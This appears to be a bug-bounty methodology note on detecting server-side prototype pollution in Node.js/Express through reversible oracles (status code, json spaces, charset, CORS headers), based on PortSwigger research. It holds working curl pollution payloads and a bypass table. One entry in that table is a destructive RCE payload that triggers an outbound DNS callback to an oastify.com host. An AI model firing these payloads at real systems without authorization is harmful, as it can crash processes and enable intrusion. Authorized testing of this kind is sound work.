---
type: pattern
title: "Server-Side Prototype Pollution — Non-Destructive Black-Box Detection"
tags: [pattern, prototype-pollution, nodejs, express, sota-2024, bb-pattern]
status: active
vuln_class: prototype-pollution
last_updated: "2026-06-03"
---

# Pattern — Server-Side Prototype Pollution: Non-Destructive Black-Box Detection

> Gareth Heyes (PortSwigger Research, 2023) published a series of findings on Server-Side Prototype Pollution (SSPP): by using the side effects of "undefined property" reads inside Express / `http-errors` / `cors` and similar modules as an oracle, you can detect server-side prototype pollution in a black box **without needing property reflection and without triggering a DoS**. A companion Burp extension is open source (PortSwigger/server-side-prototype-pollution).

## Why This Is a Real Vulnerability, Not Noise

When a Node.js application merges user-controlled JSON into an internal config object (`Object.assign`, lodash `_.merge`, `Object.merge`, etc.), if an attacker-supplied key is `__proto__` or `constructor.prototype`, `Object.prototype` itself gets polluted — affecting every subsequent piece of code in that process that reads an "undefined" property.

SSPP has historically been hard to detect: detection has relied on either (a) reflection (needing a sink that serializes the whole object back into the response), or (b) outright destruction (polluting `argv0` / `NODE_OPTIONS` to trigger a DNS callback — effectively an RCE attempt, with high DoS risk and generally unacceptable to programs/bounties).

Heyes's contribution: a set of default-undefined properties deep in the Express stack whose reads **change behavior without crashing the process** — turning them into a reversible oracle.

**Stop-loss rule**: an oracle hit only proves `Object.prototype` was polluted and that the process read that property somewhere — getting from there to RCE / data exfiltration still requires finding a gadget (a template engine, `child_process`, or a deserializer). If you only have an oracle hit with no downstream sink, classify it `verification_level: A` (live oracle), report impact as P3-P4, and do not inflate it to P1.

---

## Summary

The Server-Side Prototype Pollution pattern:

1. An endpoint accepts a JSON body and merges it into an internal config object (`Object.assign({}, defaults, req.body)` or `lodash.merge`)
2. The attacker sends `{"__proto__": {"someKey": value}}`, polluting `Object.prototype.someKey`
3. Express / middleware / application code later reads `obj.someKey` — a property never explicitly set — and picks up the polluted value, causing an observable behavior change
4. The attacker observes the behavior change (status code, JSON indentation, charset, CORS headers) to confirm pollution
5. The attacker resets the property back to its original value to restore normal behavior and avoid causing a DoS

The key insight is **choosing a low-blast-radius, reversible property** as the oracle, rather than destructive fuzzing.

---

## Detection Signals

| Signal | Tool | Meaning |
|---|---|---|
| The same endpoint accepts a variety of JSON keys without schema validation | curl + Intruder | Likely uses `Object.assign` / a merge utility |
| A JSON POST/PUT/PATCH endpoint whose response is sensitive to indentation | Burp Raw tab | The `json spaces` oracle is usable |
| Response includes `Express` / `X-Powered-By` headers | curl -I | Express stack |
| An error response's HTTP status changes after pollution (e.g. a 404 becomes 510) | curl -o /dev/null -w "%{http_code}" | `status` oracle hit |
| CORS preflight returns an unconfigured `Access-Control-Expose-Headers` | curl OPTIONS | `exposedHeaders` oracle hit |
| An `__proto__` key gets reflected back in the response (any owned property) | Diff against baseline | Reflection-based SSPP |
| Burp Scanner reports "Server-side prototype pollution" (with the official PortSwigger extension installed) | Burp BApp Store | Automated scan hit |

---

## Test Methodology

> All techniques below are from Gareth Heyes's PortSwigger Research article and the corresponding Web Security Academy lab. The status / json-spaces / charset / exposedHeaders / OPTIONS-head oracles have all been demonstrated as viable by the original author.

### Step 0: Find a suitable test endpoint

```bash
# Conditions:
# 1. Accepts a JSON body (Content-Type: application/json)
# 2. Has at least one POST/PUT/PATCH that merges into an internal config/option object
# 3. Some part of the same process later returns JSON, or returns an error (giving you an oracle to observe)

# Record a baseline first:
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"foo":"bar"}' -o /tmp/baseline.txt
```

### Step 1: Status Code Oracle (most universal)

```bash
# 1a. Hit an endpoint known to return 4xx/5xx and record the baseline status code
curl -si https://target/api/nonexistent -o /dev/null -w "BASELINE=%{http_code}\n"
# e.g. 404

# 1b. Inject a status-polluting payload into a mergeable endpoint
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"__proto__":{"status":510}}'

# 1c. Hit the same error endpoint again
curl -si https://target/api/nonexistent -o /dev/null -w "POLLUTED=%{http_code}\n"
# if it becomes 510 -> SSPP confirmed

# 1d. Clean up immediately (reset the status property — though the prototype stays
#     dirty until the process restarts)
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"__proto__":{"status":null}}'
```

The `http-errors` module reads `err.status || err.statusCode`; once the prototype is polluted, every error object inherits `status`.

### Step 2: JSON Spaces Oracle (most stealthy — recommended first choice)

```bash
# 2a. Baseline: capture the raw body of some JSON response
curl -s https://target/api/endpoint > /tmp/before.json
wc -c /tmp/before.json   # e.g. 156 bytes

# 2b. Inject a json-spaces pollution payload
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"__proto__":{"json spaces":8}}'

# 2c. Re-fetch any JSON response
curl -s https://target/api/endpoint > /tmp/after.json
wc -c /tmp/after.json    # if SSPP is present, byte count rises noticeably (extra indentation)

# 2d. Restore
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"__proto__":{"json spaces":0}}'
```

Express's `res.json()` internally reads `app.get('json spaces')`, which defaults to undefined — pollution turns it into `JSON.stringify(obj, null, 8)`. Safe, reversible, and requires no reflection.

### Step 3: Charset Oracle (UTF-7 trick)

```bash
# Inject a utf-7 charset pollution and encode a controllable string as utf-7
# +AGYAbwBv- = utf-7 encoding of "foo"
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"role":"+AGYAbwBv-","__proto__":{"content-type":"application/json; charset=utf-7"}}'

# If any subsequent JSON response's Content-Type becomes charset=utf-7,
# and the response body decodes +AGYAbwBv- back into "foo" -> SSPP confirmed
```

Note: utf-7 charset auto-decoding is deprecated in most modern browsers, but the `Content-Type` header on the Node side doesn't need browser decoding for the oracle to work.

### Step 4: CORS exposedHeaders Oracle

```bash
# Express + the cors middleware reads corsOptions.exposedHeaders
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"__proto__":{"exposedHeaders":["X-Sspp-Probe"]}}'

# Any CORS response (triggered with an Origin header)
curl -si -H 'Origin: https://example.com' https://target/api/endpoint | grep -i Access-Control
# if Access-Control-Expose-Headers: X-Sspp-Probe appears -> SSPP confirmed
```

### Step 5: OPTIONS head Oracle

```bash
# Pollute the head property to change how the router responds to OPTIONS
curl -si https://target/api/endpoint -X POST -H 'Content-Type: application/json' \
  -d '{"__proto__":{"head":true}}'

curl -si -X OPTIONS https://target/api/endpoint
# check whether the Allow header changes
```

### Step 6: Automate with the Burp extension

```
Burp → Extensions → BApp Store → "Server-Side Prototype Pollution Scanner"
Author: PortSwigger. Automatically runs the full status / json-spaces / charset / exposedHeaders oracle suite.
GitHub: https://github.com/PortSwigger/server-side-prototype-pollution
```

---

## Variants / Common Bypass Techniques

| Technique | Payload | Purpose | Source |
|---|---|---|---|
| `__proto__` direct | `{"__proto__":{"x":1}}` | Standard SSPP via `Object.assign` / `_.merge` | Heyes article (verified) |
| `constructor.prototype` | `{"constructor":{"prototype":{"x":1}}}` | Some sanitizers only strip `__proto__` | Heyes lab |
| Nested chain | `{"a":{"__proto__":{"x":1}}}` | Middleware merges a deeper child object | Heyes lab |
| Status oracle | `{"__proto__":{"status":510}}` | Observe an error endpoint's status code change | Heyes article |
| Status oracle (statusCode) | `{"__proto__":{"statusCode":510}}` | `http-errors` also reads statusCode | Heyes article |
| JSON spaces | `{"__proto__":{"json spaces":8}}` | Express `res.json` indentation; safest oracle | Heyes article (recommended first choice) |
| Charset utf-7 | `{"__proto__":{"content-type":"application/json; charset=utf-7"}}` | Content-Type injection | Heyes article |
| exposedHeaders | `{"__proto__":{"exposedHeaders":["X-Probe"]}}` | CORS middleware reads this option | Heyes article |
| OPTIONS head | `{"__proto__":{"head":true}}` | Express router behavior change | Heyes article |
| OAST RCE (destructive) | `{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=id\".oastify.com"}}` | Triggers a DNS callback via child_process spawn; **may crash the process** | Heyes article (explicitly flagged as destructive) |
| Reflection probe | `{"__proto__":"x","__proto__y":"control"}` | Check whether the sink reflects | Heyes lab |

---

## Severity Guide

| Condition | Severity | Notes |
|---|---|---|
| Oracle hit + a reachable gadget in the same process (template engine / `child_process` / deserializer), with an end-to-end RCE or data-exfil demo | **P1 Critical** | Full chain |
| Oracle hit + an auth/authz-related default property can be tampered with (e.g. `isAdmin`) with a demonstrated behavior change | P2 High | Privilege escalation |
| Oracle hit + a JSON response's indentation/charset is permanently changed (affects all users) | P3 Medium | Persistent client-side/parser impact; most programs accept this |
| Oracle hit only (status / json-spaces change), no downstream gadget demonstrated | P3-P4 | SSPP confirmed but impact limited to noise |
| Static code confirms `_.merge(req.body, ...)` usage but no dynamic verification | P4 / `verification_level: B` | Note the blocker explicitly |
| Client-side-only prototype pollution (no server-side impact) | Not this pattern | Belongs to client-side PP, report separately |

**Anti-overclaim reminder**: an oracle hit is not RCE. Heyes's own writeup clearly separates "detection" from "exploitation." The report should read: "The status-code oracle confirms `Object.prototype` is polluted via this endpoint (verified live); converting this primitive into RCE / privilege escalation requires identifying a downstream gadget that reads an attacker-controllable default property, which was not demonstrated in this submission" — unless a secondary sink really was demonstrated.

Also document cleanup in the report: "Pollution persists for the lifetime of the Node process. The PoC includes a follow-up request that resets the polluted property to its original (undefined) value, but only a process restart fully clears `Object.prototype`."

---

## Related Notes

- [[Pattern - SaaS Marketplace OAuth Defaults]] — another "framework/platform default" pattern that creates a large-scale attack surface
- Pre-submission checklist: the "three-question filter" (if an oracle hits with no gadget, what does the attacker actually gain?)
- Coverage reminder: every endpoint that accepts JSON should get an SSPP probe pass

### Source Literature

- PortSwigger Research — Server-side prototype pollution: Black-box detection without the DoS (Gareth Heyes, 2023) — <https://portswigger.net/research/server-side-prototype-pollution>
- PortSwigger Web Security Academy — Server-side prototype pollution (4 labs) — <https://portswigger.net/web-security/prototype-pollution/server-side>
- PortSwigger whitepaper PDF — <https://portswigger.net/kb/papers/firuaml/server-side-prototype-pollution.pdf>
- Official Burp extension — <https://github.com/PortSwigger/server-side-prototype-pollution>
- BCheck worked example — <https://portswigger.net/burp/documentation/scanner/bchecks/worked-examples/server-side-prototype-pollution>

### Quick Stack-Fit Guide

| Stack signal | SSPP likelihood |
|---|---|
| `X-Powered-By: Express` + a mergeable endpoint that accepts a JSON body | High |
| package.json includes `lodash.merge` / `lodash.defaultsDeep` / `Object.assign` applied to `req.body` | High |
| Fastify (schema-enforced) | Low (unless schema validation is disabled) |
| Koa + manual merge | Medium |
| NestJS + class-validator (whitelist:true) | Low |
| Non-Node.js (Python/Go/Java) | Not applicable (this pattern is specific to the JS prototype model) |
